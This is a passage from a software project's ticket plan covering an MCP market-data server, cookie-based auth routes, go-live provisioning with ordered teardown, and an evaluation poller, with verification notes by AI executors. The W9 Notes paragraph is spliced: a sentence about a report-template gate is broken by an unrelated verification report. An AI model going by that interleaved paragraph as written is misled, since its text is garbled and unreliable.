    exist today, so the audit's note that W1 left the variable unread is stale). A unit test builds
    the server against a config whose `mcpUrl` was **discovered** rather than supplied and asserts
    the download URL's origin follows it. Reading the raw variable yields `undefined` in exactly
    the deployment R43 exists for, minting URLs that fail inside a container with no obvious cause.
  - **Nothing under `api/src/mcp/` reads `process.env`.** The server factory takes
    `{ mcpOrigin, mcpToken, seriesSecret, seriesUrlTtlSec, marketdata }`; it exports mountable
    routers (`mcpRouter`, `seriesDownloadRouter`) and the tests build a throwaway Express app
    around them. The one-line mount into `api/src/app.ts` is owned by W1/W21 — **request it from
    the orchestrator and record the request in Notes**; X1 fails without it.
  - `tools/list` reports both tools, and "complete JSON Schema" is graded on: every parameter
    carries a `type` and a non-empty `description`; `required` lists exactly the non-optional
    parameters (`query` for `series_search`; `source` and `id` for `series_fetch`); `source` is an
    `enum` of `["fred","stooq"]`; and `from`/`to` document their format as `YYYY-MM-DD`.
  - Provider failures propagate W6's typed kinds unchanged — a `not_found` series is a tool error
    saying so, an `unavailable` upstream is a distinguishable retryable one, and an unrecognised
    throw is `internal`. A test asserts a tool error body never contains the token, the secret or
    the FRED key.
- **TDD:** yes.
- **Validation:**
  - `cd api && yarn typecheck`
  - `cd api && yarn test src/mcp` — must report **0 skipped** and a non-zero test count.
  - `cd api && yarn test src/mcp --reporter=verbose` must name the five rejected-auth cases, the
    four download-route 403 cases, the no-CSV-in-result case, the discovered-origin case and the
    `tools/list` schema case.
  - `git diff --name-only main -- api/src/config.ts api/src/app.ts .env.example web/` prints
    nothing — this ticket must not edit files it does not own, and the browser never calls
    `/series/download`, so wolf-web's nginx deliberately does not proxy it.
- **Depends on:** W6 *(for both `fetch` and the `search` capability, and for `countDataRows`)*
- [x] done
- Notes: **Delivered on branch `W7-marketdata-mcp`, commit `bd08963`, based on
  `W6-market-data-providers`. No fix round.** Orchestrator re-ran the Validation on 2026-08-21:
  `yarn typecheck` clean, **141 api tests** green.
  **AMENDMENT, applied: W7 owns the config wiring.** This ticket's Files line and its fourth
  Validation command said W7 must not touch `api/src/config.ts`, `.env.example` or
  `api/src/app.ts` — which contradicts the ⚠️ block in § "Parallelism and file ownership" that made
  those files strictly serial in dependency order rather than owned by three tickets. W7 is the next
  ticket in that order that needs them, so it wired them, including the two variables W6 formally
  requested: **`FRED_API_KEY`** and **`WOLF_MARKETDATA_CACHE_TTL_SECONDS`** (integer seconds,
  default 3600 — note the `_SECONDS` suffix; the conversion `ttlMs: seconds * 1000` happens where
  the cache is constructed, never inside `cache.ts`). The surviving ownership check is
  `git diff --name-only <base> -- web/`, which prints nothing. **The same contradictory wording
  appears in W8, W9, W10, W11, W16 and W21 and should be fixed there too — see R77.**
  **Three things later tickets must not break.** (1) **W8 must NOT mount `requireSignedIn`
  globally.** `/mcp` and `/series/download` are deliberately at the app root, outside `/api` and
  outside any cookie: a session container has no cookie and reaches wolf-api directly at the DinD
  gateway. `app.use(requireSignedIn)` would 401 the entire market-data surface inside containers,
  and X1 is where that would first surface (**R79**). (2) **Compose forwards an unset optional
  variable as `""`, not as absent**, and `z.coerce.number()` turns `""` into `0` — so
  `env.FOO ?? default` silently yields 0. W7 added a `present()` helper and a test; every later
  ticket adding a duration or limit variable needs the same treatment (**R80**). (3) **A variable in
  `.env.example` and `config.ts` still never reaches the container without an `environment:` entry
  in `docker-compose.yml`.** W7 added five; that file is now in the serial ownership row (**R81**).
  `series_fetch` reports `rows` from W6's `countDataRows()` and nothing else, so it cannot disagree
  with a later `dataset_put`'s `row_count` about an unmodified file. It returns **`unit: null` for
  FRED** and `"USD"` for Stooq, because W6's FRED connector exposes units only through `search()` —
  the tool description tells the model to take FRED units from `series_search` (**R78**).

### W8: Auth and hypothesis read routes   [Status: done | Model: opus]
- **Scope:** `POST /api/auth/google`, `GET /api/hypotheses`, `GET /api/hypotheses/:id`,
  `POST /api/hypotheses` — plus the two things every later Wolf route inherits and that no other
  ticket owns: the signed-cookie session module (`requireSignedIn`, which W9, W10 and W11 mount)
  and the `kind=evaluation` board read that turns the poller's summary line into `support_score`.
  Raised to **opus**: the allowlist, the cookie guard, the board parser and Orange's *asynchronous*
  session create are four independent surfaces, not one route file.
- **Repo:** agent-wolf
- **Files:** create `api/src/routes/auth.ts`, `api/src/routes/auth.test.ts`,
  `api/src/routes/hypotheses.ts`, `api/src/routes/hypotheses.test.ts`, `api/src/auth/session.ts`,
  `api/src/auth/session.test.ts`; modify `api/src/hypothesis/store.ts`,
  `api/src/hypothesis/store.test.ts`, `api/src/app.ts` (mount `cookie-parser` and both routers),
  `api/src/config.ts`, `.env.example`, **`docker-compose.yml`** (R81 — a variable in `.env.example`
  and `config.ts` never reaches the container without an `environment:` entry, and W8 is on that
  ownership row while this line omitted the file), `api/package.json` (`cookie-parser`,
  `@types/cookie-parser`). Every route is mounted under the literal `/api` prefix — no proxy
  rewrites it (**R37**).
- **Acceptance criteria:**
  - **The allowlist is `WOLF_ALLOWED_EMAILS`**: comma-separated, case-insensitive,
    whitespace-trimmed full Google addresses, parsed in `api/src/config.ts` and documented in
    `.env.example`. Unset or empty is a boot-time `misconfigured` failure naming the variable — an
    empty allowlist must not silently mean "everyone". An identity Orange verifies that the list
    does not contain is rejected **403, kind `forbidden`**: Orange verifying a token is necessary,
    never sufficient.
  - Wolf calls Orange's `POST /auth/verify-google` server-side with `WOLF_API_KEY` (that route is
    API-key-only — `go/cmd/agentd/googleauth.go`'s `authenticatedByAPIKey` gate) and maps its three
    answers separately: `200 {email, email_verified}` → continue; `401` → `forbidden` ("invalid
    credential"); **`404` → `misconfigured` naming `GOOGLE_CLIENT_ID`**, because
    `registerVerifyGoogle` mounts nothing when that variable is unset *on Orange*, and a
    configuration hole must not read as a rejected user.
  - **The session cookie is `wolf_session`, signed by `cookie-parser`'s built-in signing** (the
    pinned mechanism — no session store, no session library) with `WOLF_SESSION_SECRET`, which is
    required at boot (`misconfigured` naming it if absent or shorter than 32 characters). Flags:
    `HttpOnly`, `SameSite=Lax`, `Secure` whenever `NODE_ENV !== "development"`, 12h `maxAge`. Tests
    assert each flag on the `Set-Cookie` header and that a cookie whose signature is altered is
    rejected.
  - `requireSignedIn` is exported from `api/src/auth/session.ts` and is what W9, W10 and W11 mount;
    a request with no cookie or an invalid one is **401** with kind `forbidden` (status overridden
    on the `WolfError`), distinct from the allowlist's 403.
  - `POST /api/hypotheses` answers **201** with `{ id }` (the R36 precedent: an unstated success
    code is how five tickets got told after the fact). `GET` routes answer 200.
  - Ids are the **bare** 8-hex form from W5; the `hyp-` prefix is added exactly once, on the session
    name (§ "Vocabulary"). A test asserts the outbound session name matches `^hyp-[0-9a-f]{8}$` —
    `hyp-hyp-…` is the failure that makes the trust rule's session clause never match.
  - **Orange's session create is asynchronous and reports no provisioning failure on the POST.**
    Verified: `POST /agent/session` answers `200 {id, status:"creating", workflowId}` and provisions
    in a background goroutine (`go/httpapi/session.go`, the `go func(){ … Runner.CreateSession … }`
    block); a failure lands on the row as `status:"error"` plus `create_error`. W8 therefore creates
    with `{ name: "hyp-<id>", worker: "interviewer" }` and then polls
    `GET /agent/sessions/by-name/hyp-<id>` (which returns `status` and `create_error` —
    `go/httpapi/sessions_byname.go`) until the status leaves `creating`, bounded; on timeout,
    `unavailable`.
  - **The create failure surfaces are enumerated and each is mapped**, and a test drives all five:
    `409 session name already taken` → `conflict`; `404 no worker "interviewer" in this project` →
    `misconfigured` naming W12's bootstrap; `409 worker … is disabled` → `conflict`; `501`/`403`
    (session names unconfigured, or no project on the credential) → `misconfigured`; and a polled
    `status:"error"` → **`unavailable`, HTTP 503, with `create_error` passed through verbatim in
    `message`**. "host port pool is exhausted" (`go/execenv/docker/ports.go:69`) arrives on that
    last path and must not be flattened into "could not create"; a test asserts the exact upstream
    string reaches the response body. `unavailable` is the right kind here because deleting a
    finished session genuinely clears the condition (owner decision **B7**).
  - **If the session never reaches a healthy status, no hypothesis memory is left behind** — the
    trusted `kind=hypothesis, status=draft` memory is appended only after the poll succeeds. The
    same five-failure test asserts zero `POST /agent/memories` calls.
  - **The board issues exactly two `latest_per` requests regardless of hypothesis count**:
    `GET /agent/memories?selector=kind%3Dhypothesis&latest_per=name` and
    `GET /agent/memories?selector=kind%3Devaluation&latest_per=name`. A test with twelve
    hypotheses asserts the request count is two. (W22 raises it to three when it adds `headline`;
    do not fold that read in here — nothing writes a `kind=report` memory until W21.)
  - **`requireSignedIn` is exported and mounted PER ROUTER, never globally** (**R79**, promoted
    from a log entry to a criterion 2026-08-21). W7's `/mcp` and `/series/download` sit
    deliberately at the app root, outside `/api` and outside any cookie: a session container has no
    cookie and reaches wolf-api directly at the DinD gateway. `app.use(requireSignedIn)` 401s the
    entire market-data surface **inside containers**, where nothing in this repo's unit tests looks
    — X1 is where it would first surface, nine tickets and one container later. A test asserts that
    a request to `/mcp` and one to `/series/download`, both **with no cookie**, are NOT 401, and a
    second asserts `app.ts` contains no unqualified `app.use(requireSignedIn)`.
  - **`ORANGE_BASE_URL` is documented in `.env.example` and read through the typed `WolfConfig`**
    (**R92**, assigned to W8 2026-08-21). W12's bootstrap reads it straight from `process.env` with
    a hardcoded `http://localhost:8099` default because no ticket in its dependency set pinned it;
    this ticket already edits `config.ts` and `.env.example`, so it is the first place the variable
    can be given a home. This is where R49's "Orange's base-URL variable, pinned nowhere" finally
    lands. Document `WOLF_API_KEY` in the same pass — the bootstrap needs it too and it is on this
    ticket's own allowlist/secret edit.
  - **The evaluation summary parser lives in `api/src/hypothesis/store.ts` and there is exactly one
    of it.** It parses line 1 of each `kind=evaluation` snippet in the format pinned in § "Where the
    board's numbers come from" (`score=… tripped=… holding=… indeterminate=… evaluated=…`): all
    five keys are required, and **unrecognised `key=value` tokens are ignored rather than
    rejected**, so W10 can extend the line without breaking the board. A row whose line 1 does not
    parse yields `support_score: null` and no conditions summary, and never throws. W10 writes the
    same line and reuses this parser; a second copy in `routes/hypotheses.ts` fails the ticket.
  - `GET /api/hypotheses` returns, per row: `id, title, owner, status, support_score,
    conditions_summary, updated_at_ms, tamper?`. `tamper` is the pinned `Tamper` shape
    (§ "Shared shapes"), passed through from W5 unmodified. A hypothesis present in W5's session
    index whose state row is missing is rendered as an anomaly, never dropped.
  - `GET /api/hypotheses/:id` returns `{ hypothesis, spec, spec_source, spec_validation,
    evaluation, notes, amendments, verdict, attention_requests, atoms }`.
  - `spec` is the newest **trusted** `kind=hypothesis-spec` memory once one exists; for a `draft` it
    is the newest `kind=hypothesis-spec-candidate` memory — the pinned untrusted kind by which an
    interview running inside a container gets its proposed spec to the human who approves it.
    `spec_source` says which of the two it is, so W13 never renders a candidate as locked.
  - `spec_validation: { valid: boolean, errors: [{path, message}] }` comes from W3's validator run
    over whichever spec was returned, so W13's Go Live button can list blocking reasons *before* the
    click — W9's 422 only exists after it. `web/` never imports the validator.
  - `attention_requests: [{ id, message, created_at_sec, session_id, worker }]` is read from
    `GET /agent/attention-requests` (the `AttentionRequests` route constant in
    `go/httpapi/httpapi.go`, registered read-only) and attributed to this hypothesis when the row's
    `worker` is `researcher-<id>` **or** its `session_id` is the `hyp-<id>` session's id — the row
    carries both (`go/agentdb/attention.go:55-57`), and an interviewer ask carries only the session.
    `created_at`/`expires_at` on that row are unix **seconds**, hence the field name. The surfacing
    is here, in the route that renders it; W10's poller does not read attention requests.
  - `notes` (`kind=research-note`) and `amendments` (`kind=spec-amendment`) are returned as
    untrusted evidence and each row carries its writing worker or session, so W14 can label them.
  - `atoms` names the four Orange atoms from § "Orange atoms per hypothesis": the `hyp-<id>` session
    id, `researcher-<id>`, the schedule id (`null` before go-live) and the `<id>-<slug>` dataset
    names from the locked spec.
- **TDD:** yes.
- **Validation:**
  - `cd api && yarn test src/routes/auth src/routes/hypotheses src/auth/session src/hypothesis/store && yarn typecheck`
  - Confirm the vitest summary reports **4 test files**. `api/vitest.config.ts` includes
    `src/**/*.test.ts` only, and a positional filter that matches nothing runs zero files and exits
    **0** — a green run that proved nothing is the third trap in § "The Validation rule".
- **Depends on:** W5 *(which brings W2, W3, W4 and O11)*. O7 must be merged before any live-stack
  run: the trusted memory append is its route, and it answers **201**.
- [x] done — verified 2026-08-21, 21/21 criteria, zero defects, zero fix rounds
- Notes: **Implemented and independently verified 2026-08-21 — 21 of 21 criteria PASS, zero
  defects, zero fix rounds.** Branch `W8-auth-hypothesis-routes`, commit `63a24b0`, merged to
  `main`. 17 files; api/ went from 489 tests to **572**. **R79 held**: `requireSignedIn` is mounted
  per router, and the verifier issued real cookie-less requests to `/mcp` and `/series/download`
  and confirmed neither 401s — the criterion this ticket gained specifically to pre-empt a failure
  that would otherwise have surfaced inside a container at X1. R92 is closed: `ORANGE_BASE_URL` and
  `WOLF_API_KEY` now have a home in `.env.example` and the typed `WolfConfig`, which is where R49
  finally landed. All three R81 places were checked independently for every variable added.
  **Three findings handed forward.** (1) Two defects in `api/src/orange/client.ts`, which W8 does
  not own: `classifyStatus` has no 401 case, so an Orange 401 reads as kind `internal` (W8 detects
  it by `err.status === 401` in its own route instead); and the port-pool override builds kind
  `unavailable` carrying the **upstream** status, producing `unavailable` with HTTP 403 against a
  taxonomy that says `unavailable → 503` — W8 restates it to 503 in its create route and left the
  client alone, but **W10's poller will see the 403**, and `unavailable` is the one retryable kind.
  Both are now criteria on **W15**, the next holder of that file. (2) **R99**: `WOLF_TEST_LOGIN`
  with `NODE_ENV=production` is a boot failure and `.env.example` ships `NODE_ENV=production`, so
  X1's `run.sh` must export `development` or `test` or the Wolf stack does not boot at all.
  (3) **R100**: there is no `GET /api/auth/me` and no logout route anywhere in the plan, so W13 must
  infer signed-in state from a 401 and a user cannot sign out short of the cookie's 12 hours.
  Inherited and deliberately not made worse: the board still under-reports tamper relative to
  W14's detail page (W5's known limit), and W12's bootstrap still reads `ORANGE_BASE_URL` from
  `process.env` with its own default, so the two readers can disagree until a later ticket moves it.
  Also: adding one dependency made yarn rewrite unrelated `yarn.lock` entries — the committed
  lockfile had drifted from the manifests before this ticket; resolved versions are unchanged.
  **48 guesses, the highest of any single ticket in five waves.**
### W8b: `/api/auth/me` and logout   [Status: done | Model: sonnet]
- **Scope:** The two auth routes the plan never had. `GET /api/auth/me` tells the UI who it is;
  `POST /api/auth/logout` clears the cookie. Nothing else — no UI, no new config, no changes to
  how the cookie is minted or verified. Owner decision 2026-08-21 (**R100**): W8 shipped the
  cookie and the guard, but there was no way for the UI to ask "am I signed in, and as whom?" and
  no way to sign out except by waiting the cookie's 12 hours or rotating `WOLF_SESSION_SECRET`,
  which signs *everyone* out. W13 would otherwise have had to infer the signed-in state from a 401
  on the board.
- **Repo:** agent-wolf
- **Files:** modify `api/src/routes/auth.ts`, `api/src/routes/auth.test.ts`. Nothing else — the
  router is already mounted by W8 in `api/src/app.ts`, so **`app.ts` is NOT on this ticket's Files
  line** and a diff touching it is a defect.
- **Acceptance criteria:**
  - `GET /api/auth/me` returns **200** `{ email }` for a valid signed cookie whose email is on the
    allowlist, and **401** otherwise — no cookie, an unsigned cookie, a cookie signed with a
    different secret, an expired cookie, and a validly-signed cookie for an email **no longer** on
    `WOLF_ALLOWED_EMAILS`. A test drives all five 401 cases separately; they are not one case.
  - The 401 body is the **same shape** W8's guard already returns, not a second error shape. Reuse
    `requireSignedIn`'s refusal rather than writing a parallel one — if the route is simply mounted
    behind `requireSignedIn`, the 401 comes for free and that is the preferred implementation.
  - The email returned is the one **in the cookie**, normalised the same way W8 normalises it
    (trimmed, lower-cased). A test asserts a cookie minted from `  Kai@Example.COM  ` reads back as
    `kai@example.com`, so the UI never has to normalise.
  - `POST /api/auth/logout` returns **204** and clears `wolf_session` by setting it with an
    immediate expiry, using the **same** cookie name, path, `SameSite` and `Secure` attributes W8
    minted it with — a `Set-Cookie` that differs in any attribute does not reliably clear it.
    A test asserts the cleared cookie's attributes match the minted one's attribute for attribute.
  - **Logout is `POST`, never `GET`.** A `GET` logout is triggerable by a prefetch, an `<img>` tag
    or a link in a report panel, which is a cross-site sign-out. A test asserts `GET
    /api/auth/logout` is **404 or 405**, never 204.
  - **Logout succeeds without a valid cookie** — 204, not 401. Signing out when you are already
    signed out is not an error, and a 401 here makes the UI's "sign out" button fail exactly when a
    user most wants it to work (an expired session). A test asserts the no-cookie case is 204.
  - **R79 still holds after this ticket.** Both new routes sit under `/api`; neither is mounted
    globally and neither adds an `app.use`. The test W8 added — `/mcp` and `/series/download`
    answer without a cookie — is re-run and still passes.
- **TDD:** yes.
- **Validation:**
  - `cd api && yarn test src/routes/auth --reporter=verbose` — confirm the test COUNT for that file
    went up and name the new cases in the summary.
  - `cd api && yarn typecheck && yarn test` (whole package; report the file and test totals).
  - `git diff --name-only main -- api/src/app.ts api/src/config.ts .env.example docker-compose.yml`
    prints **nothing**.
- **Depends on:** W8 *(which brings W5, W2, W3, W4 and O11)*
- [x] done — verified 2026-08-21, 15/15 criteria, zero defects, zero fix rounds
- Notes: **Implemented and independently verified 2026-08-21 — 15 of 15 criteria PASS, zero
  defects, zero fix rounds.** Branch `W8b-auth-me-logout`, commit `08cf4e1`, merged to `main`.
  Two files, 14 new tests (auth.test.ts 14 → 28; api/ 572 → 586). `requireSignedIn` is mounted as
  **route-specific** middleware on `/me` alone — narrower than per-router, so R79 is not merely
  preserved but tightened; `app.ts` has a zero-line diff. The verifier reproduced every criterion
  with its own probe against real Express servers and real signed cookies rather than reading the
  ticket's tests and agreeing with them, and it proved the fifth 401 case — the allowlist-removed
  email, the one flagged as most likely to be faked — with a **control**: the same cookie replayed
  against the original app returns 200, which is what shows the signature verified and the
  allowlist refused. Removing an address from `WOLF_ALLOWED_EMAILS` therefore takes effect before
  the cookie expires. The clearing cookie matches the minted one on name, path, `SameSite`,
  `Secure` and `HttpOnly` — structurally, not coincidentally, because `clearSessionCookie`
  destructures `maxAge` off the same options object the mint site uses — and only the expiry
  differs. `GET /api/auth/logout` is 404 and `PUT` is 404; there is no `app.all` and no
  method-less handler, so the iframe-borne cross-site sign-out is not reachable.
  **One wording error in this ticket, which was written the same day from an owner ruling and had
  no adversarial review before its verifier's** (**R102**): the criterion says the 401 "comes for
  free" if the route is mounted behind `requireSignedIn`, which is true for four of the five cases
  and structurally impossible for the fifth — the guard has no access to `WolfConfig`'s allowlist.
  The executor added an explicit check reusing the guard's own `notSignedInError` so the body shape
  stays identical, and reported the imprecision rather than working around it silently. Same
  handling as O6a gave **R87**. Found **R102**, **R103**. 9 guesses.
### W9: Go-live provisioning and ordered teardown   [Status: done | Model: opus]
- **Scope:** `POST /api/hypotheses/:id/go-live`, `/verdict`, `/retire`, `/amend`. Go-live reads the
  candidate spec, validates it, writes it as a trusted locked memory, composes the researcher
  prompt as `locked preamble + method body`, and creates `researcher-<id>` plus the daily schedule.
  The three human routes are also the only path to a terminal state, and each ends in the ordered
  teardown.
- **Repo:** agent-wolf
- **Files:** create `api/src/hypothesis/provision.ts`, `api/src/hypothesis/provision.test.ts`;
  modify `api/src/routes/hypotheses.ts`, `api/src/routes/hypotheses.test.ts`, `api/src/config.ts`,
  `api/src/auth/session.ts`, `api/src/auth/session.test.ts`,
  `.env.example` and `docker-compose.yml` (`WOLF_TEARDOWN_DRAIN_SECONDS`, `WOLF_SCHEDULE_CRON` —
  **both files, R81/R110**: a variable in `.env.example` and `config.ts` still never reaches the
  container without an `environment:` entry). Routes mount under the
  literal `/api` prefix (**R37**) into W8's existing router; `api/src/app.ts` is untouched.
- **Acceptance criteria:**
  - **The candidate spec is the newest `kind=hypothesis-spec-candidate, name=<id>` memory**,
    whatever its provenance — it is written from inside the interview container, so it is untrusted
    by construction and W3's validator is the whole gate. `POST /api/hypotheses/:id/go-live` takes
    **no request body**; a hypothesis with no candidate is refused `422` with
    `[{path: "", message: "no spec proposed yet"}]`. (Nothing else in the plan carried the
    interview's output across the container boundary; the two candidate kinds are what do.)
  - Go-live is refused `422` with per-field errors from W3 — **all of them at once, each with its
    JSON path** — when the candidate does not validate. The hypothesis stays `draft` and nothing is
    provisioned: a test asserts zero worker, schedule and memory writes on that path.
  - **Provisioning order is fixed, and it is what makes rollback possible.** Memories are
    append-only with no delete, so the trusted `live` row must be written last or the claim is
    unsatisfiable: (1) append the trusted `kind=hypothesis-spec, status=locked` memory carrying the
    candidate JSON verbatim (`POST /agent/memories`, which answers **201** — R36); (2)
    `PUT /agent/workers/researcher-<id>` with the composed prompt; (3) `POST /agent/schedules` in
    worker mode; (4) append the trusted `kind=hypothesis, status=live` memory **last**.
  - A test injects a failure at **each of steps 1, 2 and 3 in turn** and asserts, for each: no
    `status=live` memory was appended, the status still reads `draft`, and any worker or schedule
    created by an earlier step was deleted. Step 1's memory is deliberately **not** withdrawn — an
    orphaned locked spec with no `live` row is inert — and the test asserts that too, so a later
    executor does not "fix" it with a retraction.
  - The composed researcher prompt embeds the locked spec verbatim in the preamble, including every
    `derived` metric's `method` object. A test asserts a derived metric's `method` object appears
    byte-for-byte inside the worker's `system_prompt`; the mutable method body is appended after the
    preamble and is the only part W12's critic may later rewrite.
  - The cron is **5-field**, evaluated in the stack-local timezone, and overridable by
    `WOLF_SCHEDULE_CRON` (an integer-free string; default a once-daily 5-field expression) so X1 can
    run `* * * * *`. `@daily` is never emitted — `agentdb.Schedule.Cron` is validated on write and
    refuses nicknames.
  - **Teardown order is asserted by recorded call order, not by "all five happened":**
    1. `DELETE /agent/schedules/{id}` — **first**. Draining before this cannot terminate: the
       scheduler mints a delivery every tick and only checks that the worker *exists*
       (`go/cmd/agentd/scheduler.go:363-371`), dispatch then fails it with `worker "x" is disabled`
       (`go/cmd/agentd/dispatch.go:246-248`), and the five-failure streak
       (`go/cmd/agentd/scheduler.go:768-790`) is the only thing that would ever stop it.
    2. **Drain pending deliveries for this worker.** There is no delivery-cancel route and none is
       being added — deliveries are read-only over HTTP (the `Deliveries` route constant in
       `go/httpapi/httpapi.go`, `GET /agent/deliveries`) and `DeliveryQuery` has no `worker` field
       (`go/agentdb/events.go:296-307`), while the row itself does (`EventDelivery.Worker`,
       `go/agentdb/events.go:263`). So Wolf polls `?status=pending`, filters on the row's own
       `worker` client-side, and waits until none remain, bounded by `WOLF_TEARDOWN_DRAIN_SECONDS`
       — an integer count of **seconds**, default `60` — after which teardown proceeds anyway and
       logs the delivery ids it left behind.
    3. `DELETE /agent/workers/researcher-<id>`.
    4. Delete the tick sessions: `GET /agent/sessions?user_email=*&worker=researcher-<id>` (the
       `?worker=` filter exists — `go/httpapi/history.go:123`) and delete every row it returns.
       Nothing else deletes them; the 30-minute archive loop returns the port but leaves one row per
       day per hypothesis forever.
    5. `DELETE /agent/session/{id}` for the `hyp-<id>` session.
  - A tick session still in flight is allowed to finish. Anything it writes carries a session id in
    its provenance and is therefore untrusted by construction, so it cannot change state.
  - **Teardown never deletes datasets** — a test records every outbound request and asserts none is
    a `/agent/datasets` path. The datasets are the evidence behind the verdict.
  - `/verdict` accepts `{ verdict: "confirmed" | "invalidated", rationale }`; any other `verdict`,
    or an empty `rationale`, is `400 invalid`. It appends a trusted `kind=verdict,
    status=<verdict>` memory whose content carries the rationale, the deciding user's full address
    and the **complete W4 `EvaluationResult` snapshot** — that snapshot is why the record outlives
    O3's 30-version dataset reaper — then transitions and runs the teardown above.
  - `/retire` accepts `{ rationale }`, moves the hypothesis to `archived` from any non-terminal
    state, writes the trusted `kind=hypothesis, status=archived` memory, and runs the same teardown.
  - `/amend` accepts `{ amendment_id, decision: "accept" | "reject", rationale }`; any other
    `decision` value is `400 invalid`. `accept` re-runs W3's validator over the amended spec (`422`
    with per-field errors and **nothing written** on failure), appends a new trusted
    `kind=hypothesis-spec, status=locked` memory carrying the amended spec together with
    `amendment_id`, the deciding user and the rationale, and returns the hypothesis to **`live`** —
    `challenged → live` on an accepted amendment is legal (owner decision **B3**); without it every
    amended hypothesis is stuck at `challenged` with its research still running and no route back.
  - **Only the human-initiated routes can produce `confirmed`, `invalidated` or `archived`.** All
    four routes sit behind W8's `requireSignedIn`; a test drives each one with no `wolf_session`
    cookie and asserts `401` and zero memory writes.
  - Every state change goes through W5's lifecycle machine inside its per-id mutex, with the current
    state re-read inside the critical section. Self-transitions are no-ops (**B3**).
  - **The session cookie's email is trimmed at the mint site** (**R103**). `setSessionCookie` in
    `api/src/auth/session.ts` already lower-cases the address but does not trim it, so every read
    site — this ticket, W10 and W11 — would otherwise inherit whitespace from `req.wolfUser.email`.
    That reaches allowlist comparisons and the owner label on every memory, and the K8s label value
    charset forbids spaces (**§ "Vocabulary"**), so a leading space presents as *"this user's
    hypotheses do not appear"* rather than as anything auth-shaped. Trim once, where the cookie is
    minted, not three times where it is read. A test mints from `"  Kai@Example.COM  "` and asserts
    the stored value is exactly `kai@example.com`.
- **TDD:** yes.
- **Validation:**
  - `cd api && yarn test src/hypothesis/provision src/routes/hypotheses src/auth/session && yarn typecheck`
  - Confirm the vitest summary reports **3 test files**. `api/vitest.config.ts` includes
    `src/**/*.test.ts` only, so a positional filter matching nothing runs zero files and exits **0**
    — and at least three of the criteria above (`422`, the `401` gate, the verdict snapshot) live in
    `routes/hypotheses.test.ts`, which the previous single-path filter never executed.
- **Depends on:** W8, W12 *(the locked-preamble template is a W12 deliverable)*
- [x] done
- Notes: The report layer's amendment table gives W9 a "refuse go-live unless a `report-template` **Wave 6, 2026-08-21 — passed, zero fix rounds.** `6e59d32`, 10 files, +2583. The verifier
  drove rather than read: it swapped the schedule-delete and drain blocks and watched the ordered
  assertion go red (so teardown order is genuinely load-bearing, not a set-equality test wearing a
  sequence's clothes), and injected a `retracts` append into `rollback()` to confirm the "step 1's locked
  spec is NOT withdrawn" rule is pinned by the real mechanism. It also ran W3's validator itself against
  the broken candidate and confirmed five errors each with a real JSON path. Two **minor** defects stand,
  neither blocking: the drain reads a single 200-row page of deliveries with no offset loop, and one
  config test asserts less than its name claims. Five criteria are honestly reported **unproven** — all
  five need a live stack, which is X1's job; see R112 for the one that is a plan contradiction rather
  than a coverage gap.
  exists" gate. **It is deliberately not folded in here**: nothing writes a `report-template` until
  W21, and W21 depends on W11 → W9, so implementing it now would both create a dependency cycle and
  make every go-live — including X1's — fail. Recorded for the owner in this ticket's unresolved
  list; the natural home is W21 or W22.

### W10: Evaluation poller — the `live → challenged` trigger   [Status: done | Model: opus]
- **Scope:** The mechanism that actually moves a hypothesis to `challenged`, and the writer of the
  board's numbers. Nothing else does either: Orange cannot call Wolf (no webhook; subscriptions
  dispatch workers, not HTTP), so Wolf polls. Also owns the canonical-CSV parser, because two
  tickets read dataset bytes and there must be exactly one parser in the tree.
- **Repo:** agent-wolf
- **Files:** create `api/src/hypothesis/poller.ts`, `api/src/hypothesis/poller.test.ts`,
  `api/src/hypothesis/points.ts`, `api/src/hypothesis/points.test.ts`; modify
  `api/src/hypothesis/store.ts`, `api/src/hypothesis/store.test.ts` (the `kind=evaluation` append
  and its summary line), `api/src/index.ts` (start the interval after `app.listen`),
  `api/src/hypothesis/provision.ts`, `api/src/hypothesis/provision.test.ts` (W9's teardown, for the
  **R112** fold below), `api/src/config.ts`, `api/src/config.test.ts`, `.env.example` **and
  `docker-compose.yml`** (`WOLF_POLL_INTERVAL_SECONDS` — **all three places, R81/R110/R111**: a
  variable in `.env.example` and `config.ts` still never reaches the container without an
  `environment:` entry, and since wave 6 the block at the end of `api/src/config.test.ts` **fails
  the suite** if you miss one. Do not edit that block to make yourself pass — that is a blocking
  defect).
- **Acceptance criteria:**
  - Runs on an interval — `WOLF_POLL_INTERVAL_SECONDS`, an integer count of **seconds**, default
    `300` — over every `live` hypothesis, enumerated from W5's session index
    (`GET /agent/sessions?user_email=*`, names matching `hyp-*`), never from memory alone.
  - **The interval is started in `api/src/index.ts` after `app.listen`, never as an import side
    effect.** A test that imports `createApp` asserts no timer was scheduled — otherwise every
    route test in the repo starts a live poller.
  - **Dataset reads are version-gated.** For each metric the poller first fetches
    `GET /agent/datasets/<id>-<metric-slug>`, whose response is the **bare metadata object**
    (§ "Dataset metadata JSON" — the list route wraps in `{"datasets":[…]}`, the single-name route
    does not), carrying `version`, `sha256`, `row_count` and `created_at` in unix **milliseconds**.
    It skips the byte fetch entirely when `version` is unchanged and caches parsed points by
    `(name, version)`. A test asserts a second poll over unchanged data issues **no** download
    request. A response with no `version` field is a hard `invalid` error, never treated as
    unchanged: `undefined !== undefined` is false, and that single mistake re-downloads every CSV
    288 times a day while the mocked test still passes.
  - **`parseCanonicalCsv(text) → Point[]` in `api/src/hypothesis/points.ts` is the one parser**, and
    it implements the canonical dataset CSV exactly (§ "The dataset atom"): header **exactly**
    `timestamp,value`, RFC3339 UTC timestamps, ascending, LF line endings, no trailing blank line,
    one metric per dataset. `Point` is W4's pinned `{ tMs: UnixMs; v: number }`; `tMs` is the
    RFC3339 timestamp parsed to unix **milliseconds**, matching W4's `liveAtMs`/`nowMs`, and a test
    asserts a known row round-trips to the expected integer.
  - **The parser's graded rejections are enumerated**, each a typed `invalid` error naming the
    offending line number: a header that is not byte-for-byte `timestamp,value`; a row whose column
    count is not 2; a timestamp that is not RFC3339 or not UTC; a `value` that is empty or not
    finite; a timestamp that is not strictly greater than its predecessor. A header-only file is
    **zero observations, not an error**. A wrong header must fail loudly — the whole reason this
    format is pinned is that a `t,value` header otherwise makes the poller read zero observations
    from a legitimately written dataset with no error anywhere.
  - **The poller writes the board's numbers.** It appends a trusted `kind=evaluation, name=<id>`
    memory whose line 1 is the summary line pinned in § "Where the board's numbers come from" and
    whose remaining content is the full `EvaluationResult` as JSON — but **only when that summary
    line differs from the previous one, or more than 20 hours have passed**. Two tests: an unchanged
    evaluation appends nothing; the same unchanged evaluation 21 hours later appends exactly once.
  - **Three consecutive `kind=evaluation` memories in which the same condition id is
    `indeterminate` raise attention, and the counter is derived, not held in process.** The poller
